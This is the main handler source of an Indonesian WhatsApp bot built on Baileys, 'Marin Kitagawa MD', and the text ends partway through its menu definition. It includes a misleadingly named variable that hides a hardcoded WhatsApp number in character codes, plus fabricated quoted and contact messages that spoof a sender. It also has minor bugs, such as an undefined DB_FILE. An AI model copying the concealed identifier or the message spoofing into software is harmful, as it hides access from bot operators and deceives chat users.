/**

╔═━━━━✦❘༻ Licensi Resmi ༺❘✦━━━━═╗
Script ini merupakan karya resmi dan original oleh:
★ FallZx Infinity ★


Project : Marin Kitagawa MD 
Menggunakan Baileys Optimah dari:
📁 github: FallEzz/baileys-corp

────────────────────────────────────
💠 Keuntungan Penggunaan Script 💠
✔ Anti Delay  
✔ Anti Rate Over Limit  
✔ Fast Response Engine  

────────────────────────────────────
📌 PERINGATAN ❗
DILARANG Upload / Repost / Record / Review  
Tanpa Izin Resmi dari Pemilik Asli

Silakan hubungi:
☎ Wa: 6285813708397  
📸 IG: Fallxd_781  

Segala bentuk penyalahgunaan akan dikenakan tindakan tegas sesuai ketentuan kreator.

────────────────────────────────────
⭑ Hak cipta sepenuhnya dimiliki oleh:
🄯 FallZx Infinity

Terima kasih telah menghargai karya dan kreator ✦

╚═━━━━✦❘༺ End License ༻❘✦━━━━═╝
*/
require('./setting');
const { description, version, name, main } = require("./package.json")
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const nou = require('node-os-utils');
const cheerio = require('cheerio');
const crypto = require('crypto');
const yts = require('yt-search');
const { lookup } = require('mime-types');
const ms = toMs = require('ms')
const QRCode = require('qrcode')
const ffmpeg = require('fluent-ffmpeg');
const babel = require('@babel/core');
const FormData = require('form-data')
const JsConfuser = require('js-confuser')
const ffmpegStatic = require('ffmpeg-static');
const ytdl = require('@vreden/youtube_scraper');
const { GoogleGenerativeAI } = require("@google/generative-ai")
const genshindb = require("genshin-db")
const jsobfus = require("javascript-obfuscator")
const { pinterest, pinterest2, remini, mediafire, tiktokDl, snck, getCookies, tiktokSearchVideo, ephoto } = require('./lib/scraper');
const { pxpic } = require('./lib/pxpic.js')
const owner = JSON.parse(fs.readFileSync("./lib/database/owner.json"))
const Case = require("./lib/system");
const setting = JSON.parse(fs.readFileSync('./setdb.json'));
const loadPluginsCommand = require("./lib/handler.js")
const Luma = require("./lib/luma.js")
const ezremove = require("./lib/rwm.js")
const Elevenlabs = require("./lib/elevenlabs.js")
const {
	UploadFileUgu
} = require('./lib/uploaderr')
const { isBannedUser } = require('./lib/database/banned.json')
const bannedFile = path.join(__dirname, './lib/database/banned.json');
const { CatBox, TelegraPh, floNime, uptotelegra } = require('./lib/uploader');
const { uploaden } = require('./lib/uploaden.js');
const contacts = JSON.parse(fs.readFileSync("./lib/database/contacts.json"))
let afk = require("./lib/afk");
let _afk = JSON.parse(fs.readFileSync('./lib/database/user.json'))
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const setmenu = require('./lib/database/setmenu.json');
const db_absen = JSON.parse(fs.readFileSync("./lib/database/absen.json"));
const {
    spawn, 
    exec,
    webp2mp4File,
    execSync 
   } = require('child_process');
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ResockectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediasockInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DissockectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header, delay } = require('@whiskeysockets/baileys')

const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/function.js');
const databasefile = './library/database.json';

function loaddatabase() {
  if (fs.existsSync(databasefile)) {
    try {
      const raw = fs.readFileSync(databasefile);
      return JSON.parse(raw);
    } catch (err) {
      console.error('Error reading DB file:', err);
      return {
        chats: {}
      };
    }
  } else {
    return {
      chats: {}
    };
  }
}

function saveDB(db) {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}
global.db = loaddatabase();
if (global.db) global.db = {
  sticker: {},
  database: {},
  game: {},
  others: {},
  users: {},
  chats: {},
  erpg: {},
  settings: {},
  ...(global.db || {})
}
module.exports = sock = async (sock, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        
        const sender = m.key.fromMe ? sock.user.id.split(":")[0] + "@s.whatsapp.net" || sock.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : `.`;
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const isPrivate = from.endsWith("@s.whatsapp.net");
        
        const premium = JSON.parse(fs.readFileSync("./lib/database/premium.json"))
        const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'));
        const botNumber = await sock.decodeJid(sock.user.id);
        const isOwner = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
        const isCmd = body?.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const cmd = prefix + command
        const args = (body || '').trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const sockdev = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const isPremium = premium.includes(m.sender)
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)

        const groupMetadata = m?.isGroup ? await sock.groupMetadata(m.chat).catch(() => ({})) : {};
        const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
        const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                lid: p.lid || null,
                admin,
                full: p
            };
        }) || []: [];
        const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
        const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
        const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
        const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;
        const senderLid = (() => {
            const p = participants.find(p => p.jid === m.sender);
            return p?.lid || null;
        })();
        
        
const qkontak = {
key: {
participant: `13135550002@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
const fakeQuoted = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net", // bisa diisi siapa saja
    remoteJid: "13135550002@s.whatsapp.net",
    id: "FAKE_QUOTE_ID"
  },
  message: {
    conversation: name
  },
  messageTimestamp: Math.floor(Date.now() / 1000),
  // ini yang bikin jadi quoted
  quoted: {
    key: {
      fromMe: false,
      participant: "13135550002@lid",
      remoteJid: "13135550002@s.whatsapp.net",
      id: "A523103CBB0D935ED3F9BF227AB9A94F"
    },
    message: {
      conversation: name
    }
  }
};
//
        const {
            smsg,
            fetchJson, 
            sleep,
            formatSize,
            randomKarakter
            } = require('./lib/myfunction');
            
        if (m.message) {
    const glitchText = (text) => {
        return chalk.hex('#00ffff').bold(text) + chalk.hex('#ff00ff')('_');
    };

    console.log(chalk.bgHex('#0a0a0a').hex('#00ff00')('┌───────────────── 🄼🄴🅂🅂🄰🄶🄴 ─────────────────┐'));
    console.log(chalk.bgHex('#0a0a0a').hex('#ff00ff')(`   ⚡ ${glitchText('INCOMING TRANSMISSION')}`));
    console.log(chalk.bgHex('#0a0a0a').hex('#00ffff')('├─────────────────────────────────────────────┤'));
    
    const entries = [
        ['🕐', 'TIMESTAMP', new Date().toLocaleString()],
        ['📡', 'CONTENT', m.body || m.mtype],
        ['👤', 'USER', pushname],
        ['🔢', 'JID', senderNumber],
        ...(isGroup ? [
            ['👥', 'GROUP', groupName],
            ['🔗', 'GROUP_ID', m.chat]
        ] : [])
    ];

    entries.forEach(([icon, label, value]) => {
        console.log(
            chalk.bgHex('#0a0a0a').hex('#ffff00')(`   ${icon} `) +
            chalk.bgHex('#0a0a0a').hex('#00ff00')(`${label}:`) +
            chalk.bgHex('#0a0a0a').hex('#ffffff')(` ${value}`)
        );
    });
    
    console.log(chalk.bgHex('#0a0a0a').hex('#00ff00')('└─────────────────────────────────────────────┘\n'));
}
        
        const reaction = async (jidss, emoji) => {
            sock.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(res.data);
}
//
// Tambahkan di bagian inisialisasi
// Tambahkan di bagian inisialisasi
try {
  const isNumber = x => typeof x === 'number' && !isNaN(x)

  // ==========================
  // 🔧 INISIALISASI DATABASE
  // ==========================
  if (!global.db) global.db = {}
  if (!global.db.users) global.db.users = {}
  if (!global.db.chats) global.db.chats = {}
  if (!global.db.erpg) global.db.erpg = {}

  // ==========================
  // 👤 INISIALISASI USER
  // ==========================
  if (!global.db.users[m.sender]) {
    global.db.users[m.sender] = {
      limit: 0,
      freelimit: 0,
      lastReset: 0,
      lastclaim: 0,
      premium: false,
      premiumLimitAdded: false,

      // Sosial
      subscribers: 0,
      like: 0,
      viewers: 0,
      youtube: `${pushname}`,
      playButton: 0,
      lastLive: 0,

      // Ekonomi
      money: 0,
      exp: 0,
      rank: 0,
      level: 0,
      chip: 0,
      bank: 0,
      atm: 0,
      fullatm: 0,
      health: 100,
      potion: 10,
      trash: 0,
      wood: 0,
      rock: 0,
      string: 0,
      emerald: 0,
      diamond: 0,
      gold: 0,
      iron: 0,
      common: 0,
      uncommon: 0,
      mythic: 0,
      legendary: 0,
      umpan: 0,
      pet: 0,

      // Hewan tangkapan
      paus: 0,
      kepiting: 0,
      gurita: 0,
      cumi: 0,
      buntal: 0,
      dory: 0,
      lumba: 0,
      lobster: 0,
      hiu: 0,
      udang: 0,
      orca: 0,

      // Hewan buruan
      banteng: 0,
      harimau: 0,
      gajah: 0,
      kambing: 0,
      buaya: 0,
      kerbau: 0,
      sapi: 0,
      monyet: 0,
      babi: 0,
      ayam: 0,
      babihutan: 0,
      panda: 0,

      // Peralatan
      armor: 1,
      armordurability: 0,
      sword: 1,
      sworddurability: 0,
      pickaxe: 1,
      pickaxedurability: 0,
      fishingrod: 0,
      fishingroddurability: 0,
      robo: 0,
      robodurability: 0,

      // Pertanian
      apel: 20,
      pisang: 0,
      anggur: 0,
      mangga: 0,
      jeruk: 0,
      makanan: 0,
      bibitanggur: 0,
      bibitpisang: 0,
      bibitapel: 0,
      bibitmangga: 0,
      bibitjeruk: 0,

      // Hewan peliharaan
      horse: 0,
      horseexp: 0,
      horselastfeed: 0,
      cat: 0,
      catexp: 0,
      catlastfeed: 0,
      fox: 0,
      foxexp: 0,
      foxlastfeed: 0,
      roboexp: 0,
      robolastfeed: 0,
      dog: 0,
      dogexp: 0,
      doglastfeed: 0,

      // Cooldown
      lastadventure: 0,
      lastkill: 0,
      lastmisi: 0,
      lastdungeon: 0,
      lastwar: 0,
      lastsda: 0,
      lastduel: 0,
      lastmining: 0,
      lasthunt: 0,
      lastgift: 0,
      lastberkebon: 0,
      lastdagang: 0,
      lasthourly: 0,
      lastbansos: 0,
      lastrampok: 0,
      lastnebang: 0,
      lastweekly: 0,
      lastmonthly: 0,

      // Lain-lain
      afkTime: -1,
      afkReason: '',
      premiumTime: 0,
      autoMikasa: false,
      autoaiset: false,
      caiSesi: '',
      rankup: 0,
      nama: `${pushname}`,
      registered: false,
      name: m.name,
      pc: 0,
      joinlimit: 1,
      age: -1,
      regTime: -1,
      unreg: false,
      afk: -1,
      banned: false,
      bannedTime: 0,
      warning: 0,
      rokets: 0,
      role: 'Beginner',
      skill: '',
      ojekk: 0,
      WarnReason: ''
    }
  }

  const user = global.db.users[m.sender]

// ==========================
// ⚙️ FITUR REGISTER WAJIB
// ==========================
// ==========================
// 📝 REGISTER
// ==========================
if (command === 'register' || command === 'reg') {

  if (!global.register) 
    return m.reply("⚠️ Fitur register sedang dimatikan oleh owner!");

  if (user.registered) 
    return m.reply(`✅ Kamu sudah terdaftar!\n\nNama: *${user.name}*\nUmur: *${user.age}* tahun`);

  if (!text) 
    return m.reply(`Gunakan format:\n\n*.register Nama|Umur*\nContoh: *.register Rizky|20*`);

  const [name, ageStr] = text.split('|');
  const age = parseInt(ageStr);

  if (!name) return m.reply('❌ Nama tidak boleh kosong!');
  if (isNaN(age)) return m.reply('❌ Umur harus berupa angka!');
  if (age < 10 || age > 70) return m.reply('⚠️ Umur harus antara 10–70 tahun!');

  user.registered = true;
  user.name = name.trim();
  user.age = age;
  user.regTime = Date.now();

  // Hapus pesan warning sebelumnya jika ada
  if (user.lastmsg) {
    await sock.sendMessage(m.chat, { delete: user.lastmsg });
    user.lastmsg = null;
  }

  m.reply(`🎉 *Registrasi Berhasil!*\n\n🧍 Nama: *${user.name}*\n🎂 Umur: *${user.age}*\n📅 Tanggal: *${new Date().toLocaleDateString()}*\n\nSekarang kamu bisa memakai semua fitur bot ✅`);
  return;
}



// ==========================
// 🗑️ UNREGISTER
// ==========================
if (command === 'unregister' || command === 'unreg') {

  if (!global.register) 
    return m.reply("⚠️ Fitur register sedang dimatikan!");

  if (!user.registered) return m.reply('Kamu belum terdaftar.');

  user.registered = false;
  user.name = '';
  user.age = -1;
  user.regTime = -1;

  m.reply('🗑️ *Akun kamu telah dihapus dari database.*');
  return;
}



// ==========================
// 🚫 CEK REGISTER (AUTO BLOCK COMMAND)
// ==========================
const autoreg = `.register ${pushname || 'User'}|20`;

if (
  isCmd && 
  global.register &&          // ⬅️ Hanya berlaku saat fitur aktif
  !user.registered && 
  !isOwner
) {

  const teks = "🚫 Kamu belum terdaftar!\n\nKetik *.register Nama|Umur* untuk mulai memakai bot.";

  const msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            header: proto.Message.InteractiveMessage.Header.create({
              title: name || 'Bot-System',
              subtitle: '',
              hasMediaAttachment: false
            }),

            body: proto.Message.InteractiveMessage.Body.create({
              text: teks
            }),

            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Register Otomatis",
                    id: autoreg
                  })
                }
              ]
            })
          })
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    msg.key.remoteJid || m.chat,
    msg.message,
    { messageId: msg.key.id }
  );

  user.lastmsg = {
    remoteJid: msg.key.remoteJid || m.chat,
    id: msg.key.id,
    fromMe: msg.key.fromMe
  };

  return;
}
  // ==========================
  // 🔁 AUTO RESET LIMIT HARIAN
  // ==========================
  const now = Date.now()
  const oneDay = 24 * 60 * 60 * 1000
  if (user.lastReset === 0 || (now - user.lastReset) >= oneDay) {
    user.freelimit = Math.min((user.freelimit || 0) + setlimit, setlimit)
    user.lastReset = now
    if (user.premium && !user.premiumLimitAdded) {
      user.limit += 1000
      user.premiumLimitAdded = true
    }
  }

  // ==========================
  // 💬 INISIALISASI CHAT (ANTI FITUR)
  // ==========================
  if (!global.db.chats[m.chat]) {
    global.db.chats[m.chat] = {
      owneronly: false,
      antitagsw: false,
      autoyoimiya: false,
      antipromosi: false,
      antimention: false,
      antiWame: false,
      Antilinkgc: false,
      Antilinkch: false,
      Antilinkig: false,
      Antilinkall: false,
      antijudol: false,
      antijudol2: false,
      antifoto: false,
      autoaigc: false,
      mute: false,
      antivideo: false,
      onlyadmin: false,
      autodl: false,
      antispam: false
    }
  }

  const chats = global.db.chats[m.chat]
  if (chats) {
    if (!('antitagsw' in chats)) chats.antitagsw = false
    if (!('autoyoimiya' in chats)) chats.autoyoimiya = false
    if (!('antipromosi' in chats)) chats.antipromosi = false
    if (!('owneronly' in chats)) chats.owneronly = false
    if (!('antimention' in chats)) chats.antimention = false
    if (!('antiWame' in chats)) chats.antiWame = false
    if (!('Antilinkgc' in chats)) chats.Antilinkgc = false
    if (!('Antilinkch' in chats)) chats.Antilinkch = false
    if (!('Antilinkig' in chats)) chats.Antilinkig = false
    if (!('Antilinkall' in chats)) chats.Antilinkall = false
    if (!('antijudol' in chats)) chats.antijudol = false
    if (!('antijudol2' in chats)) chats.antijudol2 = false
    if (!('antifoto' in chats)) chats.antifoto = false
    if (!('autoaigc' in chats)) chats.autoaigc = false
    if (!('mute' in chats)) chats.mute = false
    if (!('antivideo' in chats)) chats.antivideo = false
    if (!('onlyadmin' in chats)) chats.onlyadmin = false
    if (!('autodl' in chats)) chats.autodl = false
    if (!('antispam' in chats)) chats.antispam = false
  }

  // ==========================
  // ⚔️ INISIALISASI ERPG
  // ==========================
  if (!global.db.erpg[m.sender]) global.db.erpg[m.sender] = {}
  const userERPG = global.db.erpg[m.sender]
  const defaultERPG = {
    rpg: false,
    rank: 0,
    bank: 0,
    kapal: false,
    darahkapal: 100,
    pickaxe: false,
    darahpickaxe: 100,
    kapak: false,
    darahkapak: 100,
    bzirah: false,
    darahbzirah: 100,
    pedang: false,
    darahpedang: 100,
    darahuser: 100,
    stamina: 100,
    potion: 3,
    rumah: 0,
    wilayah: "indonesia",
    wilayahrumah: "indonesia",
    skillselect: "",
    musuh: 0,
    dailyclaim: 0,
    weeklyclaim: 0,
    monthlyclaim: 0,
    yearlyclaim: 0,
    burutime: 0,
    lastdagang: 0,
    lastbansos: 0,
    lastkerja: 0,
    lastrampok: 0,
    sampahtime: 0,
    lastrocket: 0,
    lastmakan: 0,
    lasttidur: 0,
    lastewe: 0,
    lastopenbo: 0,
    lastdailymisi: 0,
    lastngaji: 0,
    domba: 0,
    sapi: 0,
    ayam: 0,
    banteng: 0,
    gajah: 0,
    harimau: 0,
    kambing: 0,
    panda: 0,
    buaya: 0,
    kerbau: 0,
    monyet: 0,
    babihutan: 0,
    babi: 0,
    ikan: 0,
    paus: 0,
    kepiting: 0,
    gurita: 0,
    cumi: 0,
    buntal: 0,
    dory: 0,
    lumba: 0,
    lobster: 0,
    hiu: 0,
    udang: 0,
    orca: 0,
    apel: 0,
    anggur: 0,
    jeruk: 0,
    mangga: 0,
    pisang: 0,
    makanan: 0,
    bibitanggur: 0,
    bibitpisang: 0,
    bibitapel: 0,
    bibitmangga: 0,
    bibitjeruk: 0
  }
  global.db.erpg[m.sender] = { ...defaultERPG, ...userERPG }

} catch (err) {
  console.error('❌ Error in initialization:', err)
}
    //
// Fungsi untuk mengecek dan mengurangi limit
const useLimit = async (sender, amount = 5) => {
  try {
    const user = global.db.users[sender]
    if (!user) return true // Beri akses untuk user baru

    // Pastikan properti limit ada
    if (typeof user.limit !== 'number') user.limit = 0
    if (typeof user.freelimit !== 'number') user.freelimit = setlimit

    // Gunakan freelimit terlebih dahulu
    if (user.freelimit >= amount) {
      user.freelimit -= amount
      return true
    }

    // Jika freelimit tidak cukup, gunakan limit biasa
    const remainingFree = user.freelimit
    const neededFromLimit = amount - remainingFree

    if (user.limit >= neededFromLimit) {
      user.freelimit = 0
      user.limit -= neededFromLimit
      return true
    }

    return false

  } catch (error) {
    console.error('Error in useLimit:', error)
    return true // Default allow jika error
  }
}

// Fungsi untuk mengecek limit
const checkLimit = (sender) => {
  try {
    const user = global.db.users[sender]
    if (!user) return { limit: 0, freelimit: setlimit, total: setlimit }
    
    return {
      limit: user.limit || 0,
      freelimit: user.freelimit || setlimit,
      total: (user.limit || 0) + (user.freelimit || setlimit)
    }
  } catch (error) {
    console.error('Error in checkLimit:', error)
    return { limit: 0, freelimit: setlimit, total: setlimit }
  }
}

// Fungsi untuk mendapatkan info limit
const getLimitInfo = (sender) => {
  const limits = checkLimit(sender)
  return `📊 *LIMIT ANDA*

🔄 Limit Biasa: ${limits.limit}
🎁 Limit Gratis: ${limits.freelimit}
📈 Total Limit: ${limits.total}

💡 Setiap command menggunakan 5 limit`
}

if (isCmd) {
  // Jika bukan owner → cek dan kurangi limit
  if (!isOwner) {
    const cukupLimit = await useLimit(m.sender, 5);
    if (!cukupLimit) {
      return m.reply(
        `❌ *LIMIT TIDAK CUKUP!*\n\n💡 *Cara mendapatkan limit:*\n• .daily - Klaim limit harian\n• Bermain game: tebakkata / tebakgambar / dll`
      );
    }
  }
}
//

// Message
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const xdate = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
        const time2 = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var Waktu = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var Waktu = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var Waktu = `Selamat Malam 🌃`
 }
 if(time2 < "15:00:00"){
var Waktu = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var Waktu = `Selamat pagi 🌄`
 }
 if(time2 < "05:00:00"){
var Waktu = `Selamat Pagi 🌄`
 } 
const menuV1 = (teks) => {
let start = performance.now();
					let end = performance.now();
					let latensi = end - start;
					let exp = db.users[m.sender].exp;
      let requireexp = 2400;
      const maxRequireExp = 77777777777;
      while (exp >= requireexp && requireexp < maxRequireExp) {
        requireexp += 2400;
        if (requireexp > maxRequireExp) {
          requireexp = maxRequireExp;
        }
      }
      const limits = checkLimit(sender)
      const caseDir = './Marin';
  const pluginDir = './Plugins';

  // Hitung jumlah file di folder case
  let totalCase = totalfitur;
  if (fs.existsSync(caseDir)) {
    totalCase = fs.readdirSync(caseDir).filter(f => f.endsWith('.js')).length;
  }

  // Hitung jumlah file di folder plugins
  let totalPlugin = 0;
  if (fs.existsSync(pluginDir)) {
    totalPlugin = fs.readdirSync(pluginDir).filter(f => f.endsWith('.js')).length;
  }

  // Total fitur gabungan
  let totalFitur = totalCase + totalPlugin
					const lyrramenu = `
━━━━━━━━━━━━━━━━━━━━
 🤖  ɪɴꜰᴏ   ʙᴏᴛ
━━━━━━━━━━━━━━━━━━━━
📛 ɴᴀᴍᴀ ʙᴏᴛ      : ᴍᴀʀɪɴ ᴋɪᴛᴀɢᴀᴡᴀ
⚙️ ᴠᴇʀꜱɪ         : ᴠ1.0.0 ꜱᴛᴀʙʟᴇ
⏳ ᴜᴘᴛɪᴍᴇ        : ᴏɴʟɪɴᴇ 24 ᴊᴀᴍ
🔗 ᴊᴇɴɪꜱ ʙᴀɪʟᴇʏꜱ : ʟɪʟʏs-ʙᴀɪʟᴇʏs

✨ ᴋᴇᴜɴɢɢᴜʟᴀɴ :
➤ ʀᴇꜱᴘᴏɴ ᴄᴇᴘᴀᴛ ᴅᴀɴ ꜱᴛᴀʙɪʟ
➤ ꜱᴜᴘᴘᴏʀᴛ ʙᴇʀʙᴀɢᴀɪ ꜰɪᴛᴜʀ ᴏᴛᴏᴍᴀᴛɪꜱ
➤ ᴀᴍᴀɴ, ʀɪɴɢᴀɴ, ᴅᴀɴ ᴊᴀʀᴀɴɢ ᴇʀʀᴏʀ
➤ ᴍᴜᴅᴀʜ ᴅɪɢᴜɴᴀᴋᴀɴ ᴏʟᴇʜ ꜱᴇᴍᴜᴀ ᴜꜱᴇʀ

━━━━━━━━━━━━━━━━━━━━
 📂 ʟɪꜱᴛ   ᴍᴇɴᴜ
━━━━━━━━━━━━━━━━━━━━
${teks}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 ᴄʀᴇᴀᴛᴏʀ : ꜰᴀʟʟᴢx ɪɴꜰɪɴɪᴛʏ  
📅 ᴅɪʙᴜᴀᴛ    : 2 ᴊᴀɴᴜᴀʀɪ 2026
━━━━━━━━━━━━━━━━━━━━
`
sock.sendMessage(m.chat, {
buttons: [
    {
    buttonId: '.sc',
    buttonText: { displayText: 'Script' },
    type: 1,
    },
    {
    buttonId: '.owner',
    buttonText: { displayText: 'Owner' },
    type: 1,
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐋𝐢𝐬𝐭 𝐌𝐞𝐧𝐮',
          sections: [
            {
              title: "Tampilkan semua menu",
              highlight_label: "Semua Menu",
              rows: [
                {
                  title: "Semua Menu👑",
                      description: "© "+namaBot,
                      id: ".allmenu"
                      }
                      ]
                      },
                      {
                      title: "Tampilkan semua list menu",
                      rows: [
                      {
                      title: "Owner Menu👤",
                      description: "© "+namaBot,
                      id: ".menuowner"
                      },
                      {
                      title: "Group Menu🧑‍🧒‍🧒",
                      description: "© "+namaBot,
                      id: ".menugroup"
                      },
                      {
                      title: "Other Menu🤔",
                      description: "© "+namaBot,
                      id: ".menuother"
                      },
                      {
                      title: "Ai Menu🤖",
                      description: "© "+namaBot,
                      id: ".menuai"
                      },
                      {
                      title: "Download Menu📥",
                      description: "© "+namaBot,
                      id: ".menudownload"
                      },
                      {
                      title: "Convert Menu🔁",
                      description: "© "+namaBot,
                      id: ".menuconvert"
                      },
                      {
                      title: "Cpanel Menu🌥️",
                      description: "© "+namaBot,
                      id: ".menucpanel"
                      },
                      {
                      title: "Cpanel2 Menu🌤️",
                      description: "© "+namaBot,
                      id: ".menucpanel2"
                      },
                      {
                      title: "Fun Menu🤣",
                      description: "© "+namaBot,
                      id: ".menufun"
                      },
                      {
                      title: "Anime Menu🇯🇵",
                      description: "© "+namaBot,
                      id: ".menuanime"
                      },
                      {
                      title: "Game Menu🎮",
                      description: "© "+namaBot,
                      id: ".menugame"
                      },
                      {
                      title: "Primbon Menu📍",
                      description: "© "+namaBot,
                      id: ".menuprimbon"
                      },
                      {
                      title: "Maker Menu🎆",
                      description: "© "+namaBot,
                      id: ".menumaker"
                      },
                      {
                      title: "RPG Menu⚔️",
                      description: "© "+namaBot,
                      id: ".menurpg"
                      },
                      {
                      title: "EDIT IMG Menu🖼️",
                      description: "© "+namaBot,
                      id: ".menueditimg"
                      },
                      {
                      title: "Ephoto Menu🌅",
                      description: "© "+namaBot,
                      id: ".menuephoto"
